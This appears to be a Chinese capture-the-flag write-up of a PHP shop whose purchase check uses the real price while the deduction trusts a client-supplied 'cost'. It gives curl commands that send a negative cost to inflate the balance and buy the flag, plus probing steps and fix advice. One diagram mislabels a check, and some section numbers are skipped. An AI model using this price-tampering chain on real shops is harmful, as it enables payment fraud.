# 1. 题目分析

**题目地址**：`http://42af84b3387ab9627fc0c31f.http-ctf2.dasctf.com:80`

**题目类型**：逻辑漏洞（参数篡改 / 支付逻辑）

**初始访问**：

```bash
curl -s -i "http://42af84b3387ab9627fc0c31f.http-ctf2.dasctf.com:80/"
```


页面是一个「简洁又炫酷的登录表单」，表单 POST 提交到 `login.php`：

## 关键信息提取

| 线索 | 说明 |
|------|------|
| `Server: openresty` | 前端是 Nginx 系反向代理 |
| `X-Powered-By: PHP/7.0.33` | 后端是 PHP 7.0（注意：`empty("0")`、弱类型比较等行为） |
| `Set-Cookie: PHPSESSID=...` | 业务状态存在服务端 Session 里（余额很可能就在 Session 中） |
| 登录表单 | 唯一交互入口，逻辑漏洞题大概率在登录后功能里 |

**推理**：题目名直指「逻辑漏洞」，页面是登录入口 → 先登录进入业务功能，再寻找业务逻辑缺陷。

## 2.3 新用户自动注册（隐藏逻辑）

顺手测试 login.php 的边界行为，发现一个隐藏的业务逻辑：

```bash
# 不存在的用户名 + 任意密码 → 302 进入系统（首次即注册）
curl -s -i -d "username=testuser1&password=test123" "http://.../login.php"
# → HTTP/1.1 302 Found, Location: /user.php

# 第二次用相同用户名+正确密码 → 302（正常登录）
# 用错误密码 → HTTP/1.1 200（无 Location，登录失败）
curl -s -i -d "username=testuser1&password=WRONG" "http://.../login.php"
# → HTTP/1.1 200 OK, Content-Length: 0
```

**结论**：login.php 是「首次登录自动注册」的逻辑；每位新用户都有初始余额（后面精确测得为 **1000**）。

# 3. 漏洞分析（含推理链和失败路径）

## 3.1 第一阶段：确认余额与购买接口的行为

```bash
curl -s -b /tmp/cj.txt "http://.../buy.php?cost=2000&goods=1"
# → Money Not Enough.
```

**推理链**：

```
线索：buy.php?cost=2000&goods=1 提示 "Money Not Enough."
  ↓
假设 1：价格由客户端控制，把 cost 改小就能买（经典参数篡改）
  ↓
验证：cost=1&goods=1、cost=0&goods=1、cost=-2000&goods=1
  ↓
结果：全部返回 "Money Not Enough." —— 改小价格完全无效！
  ↓
结论：余额检查用的不是 cost 参数，而是服务端保存的商品真实价格
```

## 3.2 第二阶段：用「控制变量」还原后端逻辑

既然 `cost` 不参与余额检查，那它到底有没有用？做三组实验：

**实验 A：缺少 cost → "Empty Cost."**

```bash
curl -s -b /tmp/cj.txt "http://.../buy.php?goods=2"     # → Empty Cost.
curl -s -b /tmp/cj.txt "http://.../buy.php?cost=0&goods=2"  # → This Is a Nice Day.（cost=0 能过）
```

注意：PHP 中 `empty("0")` 为真，但 `cost=0` 没有被拦截，说明代码用的是字符串比较（如 `$cost == ''`）而不是 `empty($cost)`。

**实验 B：购买便宜商品 → 成功（且带成功文案）**

```bash
curl -s -b /tmp/cj.txt "http://.../buy.php?cost=200&goods=2"   # → This Is a Nice Day.
curl -s -b /tmp/cj.txt "http://.../buy.php?cost=999&goods=3"   # → I Miss You EveryDay.
curl -s -b /tmp/cj.txt "http://.../buy.php?cost=2000&goods=1"  # → Money Not Enough.
```

| goods | 商品 | 真实价格 | 结果 |
|-------|------|---------|------|
| 1 | FLAG | 2000 | Money Not Enough. |
| 2 | Nice | 200 | 成功（This Is a Nice Day.） |
| 3 | Miss | 300 | 成功（I Miss You EveryDay.） |

**结论**：新用户初始余额在 `[300, 1999]` 之间——买不起 2000 的 FLAG。

**实验 C：连续购买观察余额变化（同一用户）**

```bash
# testuser9 连续操作：
buy.php?cost=200&goods=2   # → 成功（扣 200）
buy.php?cost=1&goods=2     # → 成功
buy.php?cost=0&goods=2     # → 成功
buy.php?cost=-100&goods=2  # → 成功
buy.php?cost=2000&goods=2  # → 成功（！余额只有 800 左右却能过）
buy.php?cost=99999&goods=2 # → Money Not Enough.（余额已变负，真实价格检查失败）
buy.php?cost=100&goods=2   # → Money Not Enough.
```

这组数据是破题关键，能严丝合缝地反推出后端代码：

```
1. 检查阶段：用「商品真实价格」与余额比较    → 只要买得起的商品（Nice=200）就能通过检查
2. 扣款阶段：用「客户端传来的 cost」扣款     → cost=-100 时余额不降反升！
```

`cost=2000&goods=2` 成功，说明通过检查后**按 cost=2000 扣款**，余额被扣成负数；
随后 `cost=100&goods=2`（真实价 200）失败，说明检查阶段读的是**已经被扣负的真实余额**。

**漏洞模型（后端大概率代码如下）**：

```php
<?php
session_start();
$cost  = $_GET['cost'];
$goods = $_GET['goods'];

if ($cost == '')  die('Empty Cost.');

$real_price = [1 => 2000, 2 => 200, 3 => 300][$goods];
$money = $_SESSION['money'];          // 初始 1000

if ($real_price > $money)             // ① 检查：用服务端真实价格
    die('Money Not Enough.');

$money = $money - $cost;              // ② 扣款：却用客户端参数 ❌ 漏洞点
$_SESSION['money'] = $money;

if ($goods == 1) echo "FLAG{...}";
elseif ($goods == 2) echo "This Is a Nice Day.";
elseif ($goods == 3) echo "I Miss You EveryDay.";
```

## 3.3 漏洞原理（ASCII 图解）

```
正常购买 Nice（真实价 200，余额 1000）：
┌──────────────────────────────────────────────────────┐
│ cost=200, goods=2                                     │
│        ↓                                              │
│ ① 检查：real_price(200) > money(1000) ?  否 → 放行     │
│        ↓                                              │
│ ② 扣款：money = 1000 - 200 = 800                       │
│        ↓                                              │
│ 输出：This Is a Nice Day.  ✅ 正常                     │
└──────────────────────────────────────────────────────┘

攻击购买 Nice（cost=-1000000，余额 1000）：
┌──────────────────────────────────────────────────────┐
│ cost=-1000000, goods=2                                │
│        ↓                                              │
│ ① 检查：real_price(200) > money(1000) ?  否 → 放行     │
│        ↓                                              │
│ ② 扣款：money = 1000 - (-1000000) = 1001000  💥 余额暴涨│
│        ↓                                              │
│ 输出：This Is a Nice Day.                             │
└──────────────────────────────────────────────────────┘

拿到巨额余额后购买 FLAG（真实价 2000）：
┌──────────────────────────────────────────────────────┐
│ cost=2000, goods=1                                    │
│        ↓                                              │
│ ① 检查：real_price(2000) > money(1001000) ? 是 → 放行  │
│        ↓                                              │
│ ② 扣款：money = 1001000 - 2000                        │
│        ↓                                              │
│ 输出：FLAG{you_can_got_it}                            │
└──────────────────────────────────────────────────────┘
```

**根因一句话**：**校验用的值和扣款用的值不是同一个来源**——检查信任服务端真实价格，扣款却信任客户端传入的 `cost`，两者不一致即可被负数价格套利。

## 3.4 尝试过但失败的路径

| 尝试 | 预期 | 实际结果 | 排除的漏洞 |
|------|------|---------|-----------|
| `cost=1&goods=1`（FLAG 改低价） | 1 元买 FLAG | Money Not Enough. | 单纯改小价格无效，检查不用 cost |
| `cost=0.5 / 1e3 / abc / cost[]=1` | 类型混淆绕过 | 全部 Money Not Enough. | 非强/弱类型比较绕过 |
| `cost=-2000&goods=1`（负数直接买 FLAG） | 反向扣款 | Money Not Enough. | 余额检查在前，余额 1000 < 2000 过不了检查 |
| `goods=1&num=-1 / quantity=-1` | 数量负数套利 | Money Not Enough. | 不存在数量参数，只认 cost/goods |
| 枚举 register/cart/pay/admin/flag 等 20+ 路径 | 找到其他功能 | 全部 404 | 攻击面只有 login/user/buy 三个文件 |
| `.git/HEAD`、备份文件、robots.txt | 源码泄露 | 全部 404 | 无源码泄露 |

**排除法得出的结论**：唯一不受保护的输入是 `buy.php` 的 `cost`，且它只可能作用于「扣款」环节。

## 3.5 精确测量初始余额（佐证漏洞模型）

为了证明「负数 cost 确实是做加法」，用二分法测量初始余额 M：

```
固定流程（每个探测点用全新用户，排除状态干扰）：
  1. 注册新用户
  2. buy.php?cost=-X&goods=2   （真实价 200 ≤ 1000，检查必过；余额变为 M+X）
  3. buy.php?cost=2000&goods=1 （成功 ⇔ M+X ≥ 2000）
```

二分找到最小成功值 `X0 = 1000` → **初始余额 M = 2000 - 1000 = 1000**（整数，与页面价目完全自洽）。

# 4. 漏洞利用

## 4.1 完整利用链（三步）

```bash
TARGET="http://42af84b3387ab9627fc0c31f.http-ctf2.dasctf.com:80"

# 步骤 1：注册/登录一个全新用户（初始余额 1000）
curl -s -c /tmp/exp.txt -d "username=hacker$RANDOM&password=pw123" "$TARGET/login.php"

# 步骤 2：以负数价格购买最便宜的 Nice（真实价 200，检查必过）
#         余额 = 1000 - (-1000000) = 1001000
curl -s -b /tmp/exp.txt "$TARGET/buy.php?cost=-1000000&goods=2"
# → This Is a Nice Day.

# 步骤 3：用暴增后的余额购买 FLAG（真实价 2000）
curl -s -b /tmp/exp.txt "$TARGET/buy.php?cost=2000&goods=1"
# → FLAG{you_can_got_it}
```

## 4.2 对照实验（证明因果，而非巧合）

```bash
# 对照组 B：新用户正常购买便宜商品（正数 cost），再买 FLAG
curl -s -b /tmp/cb.txt "$TARGET/buy.php?cost=200&goods=2"    # → This Is a Nice Day.（正常扣款）
curl -s -b /tmp/cb.txt "$TARGET/buy.php?cost=2000&goods=1"   # → Money Not Enough.（仍然买不起）

# 实验组：新用户用负数 cost 购买便宜商品，再买 FLAG
curl -s -b /tmp/rp.txt "$TARGET/buy.php?cost=-999999&goods=2" # → This Is a Nice Day.（余额暴涨）
curl -s -b /tmp/rp.txt "$TARGET/buy.php?cost=2000&goods=1"    # → FLAG{you_can_got_it} ✅
```

对照实验证明：买得起 FLAG 的唯一原因是 `cost=-999999` **反向扣款加了余额**，而不是商品购买次数等状态。

# 6. 知识点总结

## 6.1 漏洞类型：参数篡改 / 支付逻辑漏洞

- **OWASP 分类**：Business Logic Errors（CWE-840）
- 核心特征：价格、数量、折扣等**敏感业务数据来自客户端**，且服务端：
  1. 校验时使用一套数据源（服务端真实价格）；
  2. 结算/扣款时使用另一套数据源（客户端参数）。
  两者不一致就是可利用的逻辑缺陷。

## 6.2 逻辑漏洞常见子类型

| 子类型 | 典型手法 |
|--------|---------|
| 价格篡改 | 改 `cost`/`price`、负数、小数、科学计数法 |
| 数量篡改 | `quantity=-1`、超大数量整数溢出 |
| 状态绕过 | 跳过支付步骤直接调发货接口、并发竞争（竞态条件） |
| 越权 | 改 `userid`、`orderid` 水平/垂直越权 |
| 验证绕过 | 验证码复用、响应包伪造、JWT 篡改 |

## 6.3 本次使用的技巧

- **控制变量实验**：新用户隔离状态，逐个参数做对照，避免「历史购买记录」污染结论；
- **失败也是信息**：`cost=1&goods=1` 仍失败 → 排除「检查用 cost」；`cost=2000&goods=2` 成功却把余额扣负 → 锁定「扣款用 cost」；
- **二分法测量状态**：用「负数加价 + 阈值探测」精确反推出余额为 1000，验证推理模型；
- **注意 PHP 特性**：`cost=0` 能过 `Empty Cost.` 检查，说明不是 `empty()`；PHP 7.0.33 弱类型对 `"abc"`、`"1e3"` 的处理未产生绕过。

## 6.4 修复建议（写给开发）

```php
// ❌ 错误：检查用真实价，扣款用客户端价
if ($real_price > $money) die('Money Not Enough.');
$money = $money - $cost;

// ✅ 正确：全流程只信任服务端数据
$goods_id = (int)$_GET['goods'];
$real_price = get_price_from_db($goods_id);   // 价格只从数据库取
if (!is_numeric($real_price) || $real_price < 0) die('Invalid goods');
if ($real_price > $money) die('Money Not Enough.');
$money -= $real_price;                        // 扣款也用真实价
```

- 客户端永远只提交**商品 ID + 数量**，绝不提交价格；
- 扣款前后用数据库事务 + `WHERE money >= price` 原子更新，防止并发竞争；
- 金额使用整数分存储，校验 `price > 0`；
- Session 中只存用户 ID，余额等敏感数据实时查库。
